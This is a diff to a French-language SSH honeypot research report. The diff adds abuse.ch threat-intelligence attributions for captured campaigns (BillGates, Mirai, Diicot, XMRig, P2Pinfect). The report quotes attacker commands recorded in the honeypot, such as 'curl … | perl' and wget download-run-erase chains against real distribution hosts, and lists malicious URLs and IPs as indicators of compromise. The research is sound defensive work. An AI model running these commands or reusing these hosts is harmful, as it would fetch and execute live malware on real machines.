@@ -748,11 +748,11 @@ gantt
     Changement mdp root — 1262 sessions     :active, 2026-05-01, 2026-09-21
 
     section Droppers
-    kswpad — 40 sessions, 1 IP              :2026-05-13, 2026-09-16
+    kswpad (BillGates) — 40 sessions, 1 IP  :2026-05-13, 2026-09-16
     Dropper /linux — 17 sessions, 16 IP     :2026-05-05, 2026-09-14
     Upload ELF direct — 19 sessions         :2026-05-05, 2026-09-14
     multics.x64 — 1 session                 :2026-05-01, 2026-05-02
-    fakepika (Mirai) — 2 sessions           :2026-06-17, 2026-06-18
+    fakepika (Diicot) — 2 sessions          :2026-06-17, 2026-06-18
 
     section Vague de septembre
     zed + perl — 5 sessions                 :crit, 2026-09-15, 2026-09-20
@@ -761,7 +761,7 @@ gantt
 
 **Outlaw est permanent.** Du 21 mai au 21 septembre sans interruption, 332 IP distinctes, toujours la même clé et le même bloc de recon. C'est l'arrière-plan constant d'Internet.
 
-**`kswpad` : 40 sessions, une seule IP.** Un opérateur unique, persévérant, qui est revenu pendant quatre mois. Comme le honeypot conserve son overlay qcow2, il a retrouvé « sa » machine à chaque visite.
+**`kswpad` : 40 sessions, une seule IP.** Un opérateur unique, persévérant, qui est revenu pendant quatre mois. Comme le honeypot conserve son overlay qcow2, il a retrouvé « sa » machine à chaque visite. URLhaus identifie deux des binaires de la famille comme **BillGates** (alias Elknot), un bot DDoS Linux de longue date : cet opérateur cherchait de la bande passante, pas du CPU.
 
 **La vague de septembre.** Les campagnes `zed`+`perl` et `bo.sh` n'apparaissent qu'en toute fin de période (15-20 septembre), chacune depuis 5 IP distinctes. C'est le style Outlaw — le payload `zed` est un script Perl de bot IRC — mais avec une nouvelle infrastructure et un mode de livraison plus propre.
 
@@ -797,6 +797,8 @@ pkill kswpad
 
 Le dépôt dans `/etc` plutôt que `/tmp` est délibéré : `/tmp` est souvent monté en `noexec` et purgé au redémarrage, `/etc` ne l'est jamais. La rotation de ports (3594 → 26346, 35415 → 62123) est une évasion de blocage basique.
 
+URLhaus identifie `kal64` et `kswpad` comme **BillGates / Elknot**, un bot DDoS Linux. L'infrastructure ne lui est d'ailleurs pas réservée : ThreatFox recense `151.241.154.172` comme serveur de commande **Remcos** (un RAT Windows), et `195.177.94.72` a aussi servi des payloads Windows, étiquetés `exe`, `msi` et `connectwise`.
+
 ### Famille « /linux » — un binaire, beaucoup d'hôtes
 
 Le même schéma d'URL sur 13 hôtes différents, majoritairement des IP Alibaba Cloud :
@@ -820,6 +822,8 @@ Le même schéma d'URL sur 13 hôtes différents, majoritairement des IP Alibaba
 
 Chaque hôte utilise un port haut différent. L'infrastructure est jetable : chaque IP ne sert que quelques sessions avant d'être remplacée.
 
+URLhaus confirme le « un seul binaire » : le même fichier (SHA-256 `a505de0a…`) a été collecté sur 7 de ces hôtes. Deux hôtes de la famille sont étiquetés **P2Pinfect**, un ver écrit en Rust qui se propage via Redis et SSH et embarque un mineur — une identification probable, mais indirecte.
+
 ### Famille « zed » — bot IRC en Perl
 
 ```bash
@@ -835,13 +839,15 @@ timeout 60 curl -sS http://154.70.152.216/zed | perl >/dev/null 2>&1 &
 
 Le pipe `curl | perl` est notable : **rien n'est écrit sur disque**. Le script s'exécute directement en mémoire, ce qui le rend invisible à un antivirus basé sur l'analyse de fichiers. Le `nohup … </dev/null &` avec triple redirection garantit la survie à la fermeture de la session SSH.
 
+URLhaus a collecté **15 scripts Perl différents** sur `154.70.152.216/zed` : le contenu change d'un téléchargement à l'autre, l'URL reste la même.
+
 ### Autres
 
 | Hôte | Pays | URL | Note |
 |---|---|---|---|
-| `45.153.34.212` | 🇳🇱 Pays-Bas | `45.153.34.212/fakepika`, `:8181/.bia`, `:8181/.dcplm` | variante Mirai ; fichiers à point pour se cacher d'un `ls` |
-| `64.89.161.144` | 🇺🇸 États-Unis | `:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG` | chemin aléatoire — anti-signature d'URL |
-| `31.56.209.39` | 🇳🇱 Pays-Bas | `/wget.sh`, `/curl.sh` | double dropper selon l'outil disponible |
+| `45.153.34.212` | 🇳🇱 Pays-Bas | `45.153.34.212/fakepika`, `:8181/.bia`, `:8181/.dcplm` | attribué par ThreatFox à **Diicot**, un groupe roumanophone : dropper Mirai et proxy de minage XMRig ; fichiers à point pour se cacher d'un `ls` |
+| `64.89.161.144` | 🇺🇸 États-Unis | `:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG` | mineur **XMRig** selon URLhaus ; chemin aléatoire — anti-signature d'URL |
+| `31.56.209.39` | 🇳🇱 Pays-Bas | `/wget.sh`, `/curl.sh` | **Mirai** selon URLhaus ; double dropper selon l'outil disponible |
 | `59.110.9.189` | 🇨🇳 Chine | `:9684/linux` | famille `/linux` |
 
 La chaîne complète de `fakepika` illustre bien le pattern « télécharger, exécuter, effacer » :
@@ -859,6 +865,14 @@ echo "history -cw; cd /tmp; rm -rf *.sh; rm -rf bizy*; rm -rf odin*; wget http:/
 ```
 
 `bizy*` et `odin*` sont des familles concurrentes.
+
+### Recoupement avec le renseignement public
+
+Après l'étude, j'ai recherché chaque URL et chaque hôte dans les bases d'[abuse.ch](https://abuse.ch/) (URLhaus, ThreatFox, MalwareBazaar). Uniquement des métadonnées : rien n'a été téléchargé.
+
+- **Couverture** : 23 des 46 URLs et 14 des 24 hôtes étaient déjà connus. Les 10 autres hôtes — surtout de la famille `/linux`, plus `66.116.243.130` — n'apparaissent dans aucune des trois bases.
+- **Familles** : toutes les familles identifiées sont soit des mineurs (XMRig, P2Pinfect), soit des bots DDoS (BillGates, Mirai). Aucune n'est un voleur d'informations — ce qui rejoint ce que suggéraient les commandes de recon : la cible, ce sont les ressources de la machine, pas son contenu.
+- **Réserve** : ce sont des étiquettes de tiers, pas ma propre analyse des binaires.
 
 ### Synthèse géographique de l'infrastructure de distribution
 
@@ -927,6 +941,6 @@ L'architecture qui rend ce honeypot sûr conditionne aussi ce qu'il peut voir. Q
 
 - **Données** : base SQLite du honeypot, du 28/04/2026 au 21/09/2026. Les commandes ont été reconstruites à partir des flux d'entrée (`"i"`) des enregistrements asciinema v2, et non depuis un historique shell — donc rien n'échappe à un `history -c`.
 - **Géolocalisation** : base MaxMind GeoLite2-Country, interrogée **localement**. Aucune adresse IP n'a été transmise à un service tiers.
-- **Payloads** : aucun binaire ni script n'a été téléchargé, analysé dynamiquement ou exécuté. La microVM est dépourvue d'interface réseau ; toutes les tentatives de téléchargement ont échoué au niveau socket. Les URLs publiées proviennent exclusivement de la lecture des frappes clavier.
+- **Payloads** : aucun binaire ni script n'a été téléchargé, analysé dynamiquement ou exécuté. La microVM est dépourvue d'interface réseau ; toutes les tentatives de téléchargement ont échoué au niveau socket. Les URLs publiées proviennent exclusivement de la lecture des frappes clavier. Le 03/10/2026, les URLs et les hôtes de distribution ont été recherchés dans les bases d'abuse.ch (URLhaus, ThreatFox, MalwareBazaar) ; ce sont les seules données transmises à un tiers, et ce sont des indicateurs déjà publiés ici.
 - **Vie privée** : les adresses IP publiées sont celles de machines ayant activement attaqué un système tiers, et celles d'infrastructures de distribution de malware. Elles sont diffusées comme indicateurs de compromission.
 - **Attribution** : aucune. La géolocalisation IP décrit l'emplacement d'une infrastructure, pas l'identité ou la nationalité d'un opérateur.
